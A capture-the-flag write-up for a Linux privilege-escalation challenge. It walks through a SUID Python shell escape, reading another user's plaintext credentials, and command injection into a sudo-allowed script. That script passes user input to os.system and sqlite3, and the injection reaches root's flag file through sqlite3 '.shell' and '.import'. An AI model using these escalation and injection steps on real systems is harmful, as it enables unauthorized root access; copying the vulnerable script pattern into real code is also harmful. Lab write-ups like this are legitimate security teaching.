---
description: SUID and Sudo misconfigurations
---

# Space University of Interior Design

## Description

Storytelling is the root of interior design.

`nc 20.198.209.142 55022`

_The flag is in the flag format: STC{...}_

**Author: zeyu2001**

## Solution

We start off as a guest user, and need to escalate our privileges to get the flag.

```text
$ id
uid=1001(guest) gid=1001(guest) groups=1001(guest)
```

Let's find all files with SUID permissions.

```text
$ find / -perm /4000 
/bin/umount
/bin/ping
/bin/mount
/bin/su
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/python3.7
/usr/bin/sudo
```

We find that Python has SUID permissions. Refer to [https://gtfobins.github.io/gtfobins/python/](https://gtfobins.github.io/gtfobins/python/). 

This allows us to gain the privileges of the file owner.

Use the following command, and observe that our EUID has changed to that of `jared`.

```text
$ python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
$ id
uid=1001(guest) gid=1001(guest) euid=1000(jared) groups=1001(guest)
```

Without having the true UID set to that of `jared`, we cannot `sudo`. But while we were previously unable to view `jared`'s files, we can now view them.

```text
$ ls -la jared
total 900
drwx------ 1 jared jared   4096 Jul  8 18:48 .
drwxr-xr-x 1 jared jared   4096 Jul  8 18:39 ..
-rwx------ 1 jared jared    220 Apr 18  2019 .bash_logout
-rwx------ 1 jared jared   3526 Apr 18  2019 .bashrc
-rwx------ 1 jared jared    807 Apr 18  2019 .profile
-rwx------ 1 jared jared 884736 Nov 29  2015 chinook.db
-rwx------ 1 jared jared    117 Jul  8 18:38 creds.txt
-rwx------ 1 jared jared    668 Jul  8 17:58 query_db.py
```

There is an interesting file in `jared`'s directory.

```text
$ cat jared/creds.txt
In case I forget my credentials.

jared:iamrich

Thanks to my awesome sysadmin, no one else can see this file!
```

We found `jared`'s credentials. Now, we can `su` to gain full permissions. Observe that the true UID is now that of `jared`.

```text
$ id
uid=1001(guest) gid=1001(guest) euid=1000(jared) groups=1001(guest)

$ su jared
iamrich

$ id
uid=1000(jared) gid=1000(jared) groups=1000(jared),27(sudo)
```

If we check our `sudo` privileges, we find that we can execute `query_db.py` with elevated privileges.

```text
$ sudo -l 
Matching Defaults entries for jared on fa9f84013480:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jared may run the following commands on fa9f84013480:
    (ALL) NOPASSWD: /home/jared/query_db.py
```

This Python file queries the `chinook.db` database, and allows a `--row` argument.

```python
#!/usr/bin/python3
import os
import tempfile
import argparse


def query_db(row):
    
    if not row:
        row = 'FirstName'

    sql = f".open /home/jared/chinook.db\nSELECT {row} FROM employees;"
    os.system(f'echo "{sql}" | /usr/bin/sqlite3')

    print("Done!")

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("--row", help="Row to query")
    args = parser.parse_args()

    query_db(args.row)
```

If we refer to [https://gtfobins.github.io/gtfobins/sqlite3/](https://gtfobins.github.io/gtfobins/sqlite3/), we can find some payloads to help us. Here are two working payloads to get the flag.

### Payload 1

`sqlite3` has the `.shell` command, which allows you to run system commands.

```text
.shell CMD ARGS...       Run CMD ARGS... in a system shell
```

We can use this to run `cat /root/flag.txt`.

```text
$ sudo ./query_db.py --row "FirstName FROM employees;\n.shell cat /root/flag.txt;\nSELECT FirstName"
Andrew
Nancy
Jane
Margaret
Steve
Michael
Robert
Laura
STC{sud0_4nd_su1d_ea4b1d43ddf99e0c8f3338c8e33d5808}Andrew
Nancy
Jane
Margaret
Steve
Michael
Robert
Laura
Done!
```

### Payload 2

We can alternatively use `.import` to import data from a file into a table.

```text
$ sudo ./query_db.py --row "FirstName FROM employees;\n.open\nCREATE TABLE a(line TEXT);\n.import /root/flag.txt a\nSELECT * FROM a;\nSELECT FirstName"
Andrew
Nancy
Jane
Margaret
Steve
Michael
Robert
Laura
STC{sud0_4nd_su1d_ea4b1d43ddf99e0c8f3338c8e33d5808}
Done!
```

Both are equally valid! The flag is `STC{sud0_4nd_su1d_ea4b1d43ddf99e0c8f3338c8e33d5808}`.

